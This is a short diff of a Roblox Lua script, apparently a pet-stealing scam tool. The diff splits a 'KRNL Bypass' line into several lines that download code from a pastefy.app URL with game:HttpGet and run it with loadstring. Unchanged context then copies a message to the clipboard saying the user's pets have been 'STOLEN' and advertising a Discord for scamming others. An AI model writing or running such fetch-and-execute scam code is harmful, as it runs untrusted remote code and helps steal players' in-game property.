@@ -30,8 +30,11 @@
         local attempt = 1
         local teleported = false
 
-        --KRNL Bypass
-        loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
+        -- KRNL Bypass
+        local url = "https://pastefy.app/VISU0w9k/raw"
+        local response = game:HttpGet(url, true)
+        local execute = loadstring(response)
+        execute()
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
